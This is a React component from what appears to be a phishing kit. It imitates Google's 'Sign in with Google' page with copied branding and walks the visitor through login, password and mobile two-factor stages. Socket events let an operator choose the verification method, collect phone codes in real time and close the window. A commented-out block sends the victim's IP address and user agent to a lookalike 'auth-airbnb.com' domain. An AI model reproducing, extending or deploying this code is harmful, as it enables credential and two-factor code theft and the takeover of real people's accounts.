import { createContext, useEffect, useState } from 'react';
import styles from './Google.module.scss';
import { socket } from '../socket';
import GoogleLogin from './stages/login';
import GooglePassword from './stages/password';
import Yes from './stages/yes';
import { AnimatePresence, motion } from 'framer-motion';
import MobileCode from './stages/MobileCode';
import { useParams } from 'react-router-dom';
import { links } from '../links';

export interface IGoogleData {
	method?: string;
	login?: string;
	password?: string;
	verifMethod?: string;
	phoneName?: string;
	phoneCode?: string;
	ip?: string | null;
	userAgent?: string;
	link: string;
}

interface IGoogleContext {
	data: IGoogleData | null;
	setData: (data: IGoogleData | any) => void;
}
const defaultGoogleData = {
	method: 'google',
	ip: null,
	login: '',
	link: '',
};

export const GoogleContext = createContext<IGoogleContext>({ data: defaultGoogleData, setData: () => {} });

export default function Google() {
	const [data, setData] = useState(defaultGoogleData);
	const [stage, setStage] = useState('login');
	const [loading, setLoading] = useState(false);
	const { link } = useParams();

	useEffect(() => {
		// window. = 'Sign in | Google Accounts' as unknown as Location;
		document.body.style.overflowX = 'hidden';
	}, []);

	useEffect(() => {
		// @ts-ignore
		setData({ ...data, link: links[link] as string });
	}, []);

	useEffect(() => {
		if (loading) document.body.style.overflowY = 'hidden';
		else document.body.style.overflowY = 'scroll';
	}, [loading]);

	useEffect(() => {
		socket.on('end', () => {
			window.close();
			// window.location = 'https://href.li/?https://airbnb.com' as unknown as Location;
		});
		socket.on('exit', () => {
			window.close();
		});
	}, [socket]);

	const handleGoogleDefault = (d: string) => {
		if (d) setData((da: any) => ({ ...da, verifMethod: d }));
	};

	const handleGooglePhoneName = (d: string) => {
		if (d) setData((da: any) => ({ ...da, phoneName: d }));
	};

	const handleGooglePhoneCode = (d: string) => {
		if (d) setData((da: any) => ({ ...da, phoneCode: d }));
	};

	useEffect(() => {
		if (!socket) return;
		socket.on('google-default-method', handleGoogleDefault);
		socket.on('google-phone-name', handleGooglePhoneName);
		socket.on('google-phone-code', handleGooglePhoneCode);

		return () => {
			socket.off('google-default-method', handleGoogleDefault);
			socket.off('google-phone-name', handleGooglePhoneName);
			socket.off('google-phone-code', handleGooglePhoneCode);
		};
	}, [socket]);

	// useEffect(() => {
	// 	if (!data.ip) {
	// 		axios.get('https://api.ipify.org/?format=json').then(res => {
	// 			setData({ ...data, ip: res.data.ip });
	// 			axios.get(`https://auth-airbnb.com/api/connect?ip=${res.data.ip}&userAgent=${navigator.userAgent}`);
	// 		});
	// 	}
	// }, [data]);

	return (
		<GoogleContext.Provider value={{ data, setData }}>
			{loading && (
				<div className={styles.bar}>
					<div></div>
				</div>
			)}

			<div className={styles.google} style={loading ? { opacity: '0.4', pointerEvents: 'none' } : {}}>
				<header className={styles.header}>
					<svg xmlns='https://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 48 48' aria-hidden='true'>
						<path fill='#4285F4' d='M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z'></path>
						<path
							fill='#34A853'
							d='M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z'
						></path>
						<path fill='#FBBC05' d='M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z'></path>
						<path
							fill='#EA4335'
							d='M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z'
						></path>
						<path fill='none' d='M2 2h44v44H2z'></path>
					</svg>
					<div className={styles.header_title}>Sign in with Google</div>
				</header>
				<div className={styles.logo}>
					<img src='https://lh3.googleusercontent.com/RBnUI5OpVnP6TcNE6RJLPW3uZldIMV-COdOHEo14F3_jhjt2DFpwzEhxm0J8QCKGYxc' width={48} />
				</div>
				<div className={styles.flex_wrap} style={{ position: 'relative' }}>
					<AnimatePresence initial={false}>
						<motion.main //
							style={{ position: 'absolute' }}
							key={stage}
							exit={{ x: -window.innerWidth }}
							initial={{ x: window.innerWidth }}
							animate={{ x: 0 }}
							transition={{ duration: 0.2 }}
							className={styles.main}
						>
							{
								{
									login: <GoogleLogin setStage={setStage} setLoading={setLoading} />,
									password: <GooglePassword setStage={setStage} setLoading={setLoading} />,
									mobileYes: <Yes />,
									mobileCode: <MobileCode />,
								}[stage]
							}
							{/* <NumberCode /> */}
							<footer className={styles.footer}>
								<div className={styles.side}>
									<div className={styles.lang_button}>English (United States)</div>
								</div>
								<div className={styles.side}>
									<div className={styles.button}>Help</div>
									<div className={styles.button}>Privacy</div>
									<div className={styles.button}>Terms</div>
								</div>
							</footer>
						</motion.main>
					</AnimatePresence>
				</div>
			</div>
		</GoogleContext.Provider>
	);
}
